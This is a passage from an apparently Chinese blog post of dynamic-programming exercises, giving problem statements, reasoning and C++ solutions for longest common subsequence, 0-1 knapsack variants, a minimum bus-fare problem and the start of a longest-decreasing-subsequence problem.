class="line"><span class="keyword">char</span> s[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">char</span> s1[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;s1)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="built_in">strlen</span>(s);++i)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="built_in">strlen</span>(s1);++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i<span class="number">-1</span>]==s1[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[<span class="built_in">strlen</span>(s)][<span class="built_in">strlen</span>(s1)] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对每组测试数据，输出其对应的所装物品的最大价值。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>节约空间，用一维数组<code>m[i]</code>代表容量为<code>i</code>的时候可以装入的最大价值。</p><p>每一次<code>V[i][j]</code>改变的值只与<code>V[i-1][x]</code> <code>{x:1...j}</code>有关，<code>V[i-1][x]</code>是前一次i循环保存下来的值；因此，可以将V缩减成一维数组，从而达到优化空间的目的，状态转移方程转换为 <strong>m(j)= max{m(j), m(j-w(i))+v(i)}</strong>；</p><p>并且，状态转移方程，每一次推导<code>V[i][j]</code>是通过<code>V[i-1][j-w(i]</code>来推导的，所以一维数组中j的扫描顺序应该从大到小(capacity到0)，否者前一次循环保存下来的值将会被修改，从而造成错误。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/f4802690f4daec43.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/1cc652522ecfe69d.png" alt="img"> </p><p>同样以上述例子中i=3时来说明，有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">　　　　1) i&#x3D;3，j&#x3D;8，w(3)&#x3D;4，v(3)&#x3D;5，有j&gt;w(3)，则B(8)&#x3D;max｛B(8)，B(8-w(3))+v(3)｝&#x3D;max｛B(8)，B(4)+5｝&#x3D;max｛7，4+5｝&#x3D;9；</span><br><span class="line"></span><br><span class="line">　　　　2) j- -即j&#x3D;7，有j&gt;w(3)，则B(7)&#x3D;max｛B(7)，B(7-w(3))+v(3)｝&#x3D;max｛B(7)，B(3)+5｝&#x3D;max｛7，4+5｝&#x3D;9；</span><br><span class="line"></span><br><span class="line">　　　　3) j- -即j&#x3D;6，有j&gt;w(3)，则B(6)&#x3D;max｛B(6)，B(6-w(3))+v(3)｝&#x3D;max｛B(6)，B(2)+5｝&#x3D;max｛7，3+5｝&#x3D;8；</span><br><span class="line"></span><br><span class="line">　　　　4) j- -即j&#x3D;5，有j&gt;w(3)，则B(5)&#x3D;max｛B(5)，B(5-w(3))+v(3)｝&#x3D;max｛B(5)，B(1)+5｝&#x3D;max｛7，0+5｝&#x3D;7；</span><br><span class="line"></span><br><span class="line">　　　　5) j- -即j&#x3D;4，有j＝w(3)，则B(4)&#x3D;max｛B(4)，B(4-w(3))+v(3)｝&#x3D;max｛B(4)，B(0)+5｝&#x3D;max｛4，0+5｝&#x3D;5；</span><br><span class="line"></span><br><span class="line">　　　　6) j- -即j&#x3D;3，有j&lt;w(3)，继续访问数组会出现越界，所以本轮操作停止，B(0)到B(3)的值保留上轮循环（i&#x3D;2时）的值不变，进入下一轮循环i++；</span><br></pre></td></tr></table></figure><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/3c20b033ecb118dd.png" alt="img"></p><p>　　如果j不逆序而采用正序j=0…capacity，如上图所示，当j=8时应该有B(8)=B(8-w(3))+v(3)=B(4)+5，然而此时的B(4)已经在j=4的时候被修改过了，原来的B(4)=4，现在B(4)=5，所以计算得出B(8)=5+5=10，显然这于正确答案不符合；所以该一维数组后面的值需要前面的值进行运算再改动，如果正序便利，则前面的值将有可能被修改掉从而造成后面数据的错误；相反如果逆序遍历，先修改后面的数据再修改前面的数据，此种情况就不会出错了；</p><p>参考：<a href="https://www.cnblogs.com/christal-r/p/dynamic_programming.html" target="_blank" rel="noopener">https://www.cnblogs.com/christal-r/p/dynamic_programming.html</a></p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line">ll m[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    ll c, w[maxn], v[maxn];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</span><br><span class="line">    <span class="comment">//cin &gt;&gt; t;</span></span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld %d"</span>, &amp;c, &amp;n);</span><br><span class="line">        <span class="comment">//cin &gt;&gt; c &gt;&gt; n;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld %lld"</span>, &amp;w[i], &amp;v[i]);</span><br><span class="line">            <span class="comment">//cin &gt;&gt; w[i] &gt;&gt; v[i];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i,j,jMax = <span class="built_in">min</span>(w[n] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            m[n][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">            m[n][j] = v[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">1</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            jMax = <span class="built_in">min</span>(w[i] - <span class="number">1</span>, c);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">                m[i][j] = m[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">                m[i][j] = <span class="built_in">max</span>(m[i + <span class="number">1</span>][j], m[i + <span class="number">1</span>][j - w[i]] + v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        m[<span class="number">1</span>][c] = m[<span class="number">2</span>][c];</span><br><span class="line">        <span class="keyword">if</span> (c &gt;= w[<span class="number">1</span>])</span><br><span class="line">            m[<span class="number">1</span>][c] = <span class="built_in">max</span>(m[<span class="number">1</span>][c], m[<span class="number">2</span>][c - w[<span class="number">1</span>]] + v[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, m[<span class="number">1</span>][c]);</span><br><span class="line">        <span class="comment">//cout &lt;&lt; m[1][c] &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line">ll m[<span class="number">10005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    ll c, w[maxn], v[maxn];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</span><br><span class="line">    <span class="comment">//cin &gt;&gt; t;</span></span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld %d"</span>, &amp;c, &amp;n);</span><br><span class="line">        <span class="comment">//cin &gt;&gt; c &gt;&gt; n;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld %lld"</span>, &amp;w[i], &amp;v[i]);</span><br><span class="line">            <span class="comment">//cin &gt;&gt; w[i] &gt;&gt; v[i];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = c; j &gt;= <span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(m[j]&lt;=m[j-w[i]]+v[i] &amp;&amp; j-w[i]&gt;=<span class="number">0</span> )<span class="comment">//二维变一维，防止越界</span></span><br><span class="line">                &#123;</span><br><span class="line">                   m[j]=m[j-w[i]]+v[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; m[c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; w &gt;&gt; n;</span><br><span class="line">    vector&lt;int&gt; wei(1), val(1);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a, b;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        wei.push_back(a);</span><br><span class="line">        val.push_back(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(w+<span class="number">1</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= w; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(wei[i] &gt; j)</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j-wei[i]]+val[i], dp[i<span class="number">-1</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; dp[n][w] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="节食的限制"><a href="#节食的限制" class="headerlink" title="节食的限制"></a>节食的限制</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>重量和价值相等的0-1背包问题。</p><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">55</span>;</span><br><span class="line">ll m[<span class="number">45005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    ll c, w[maxn];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld %d"</span>, &amp;c, &amp;n);</span><br><span class="line">        <span class="comment">//cin &gt;&gt; c &gt;&gt; n;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;w[i]);</span><br><span class="line">            <span class="comment">//cin &gt;&gt; w[i] &gt;&gt; v[i];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = c; j &gt;= <span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(m[j]&lt;=m[j-w[i]]+w[i] &amp;&amp; j-w[i]&gt;=<span class="number">0</span> )<span class="comment">//二维变一维</span></span><br><span class="line">                &#123;</span><br><span class="line">                   m[j]=m[j-w[i]]+w[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; m[c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="汽车费用"><a href="#汽车费用" class="headerlink" title="汽车费用"></a>汽车费用</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。</p><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。</p><h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>仅一个整数表示最少费用。</p><h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12 21 31 40 49 58 69 79 90 101</span><br><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">147</span><br></pre></td></tr></table></figure><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>动态规划，依次计算出行走<code>i</code>公里需要的最少费用。</p><p>计算行走<code>i</code>公里最少费用时，用<code>j</code>遍历<code>[1~i0]</code>，当<code>i&gt;=j</code>的时候依次比较<code>m[i]</code>和<code>n[j]+m[i-j]</code>的值，遍历完成后，<code>m[i]</code>为最少费用。</p><p>例如，<code>m[4] = min(m[0]+n[4], m[1]+n[3], m[2]+n[2], m[3]+n[1])</code></p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> n[<span class="number">15</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= t;i++)&#123;</span><br><span class="line">        m[i] = maxn;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">10</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;=j)</span><br><span class="line">                m[i] = <span class="built_in">min</span>(m[i], m[i - j] + n[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m[t] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="求数组的最长递减子序列"><a href="#求数组的最长递减子序列" class="headerlink" title="求数组的最长递减子序列"></a>求数组的最长递减子序列</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>输出最长递减子序列，数字之间有一个空格。</p><h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>O(nlogn)的写法，有点困了，明天起来再理解一下。</p><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> g[<span class="number">30010</span>], num[<span class="number">30010</span>], d[<span class="number">30010</span>];</span><br><span class="line"><span 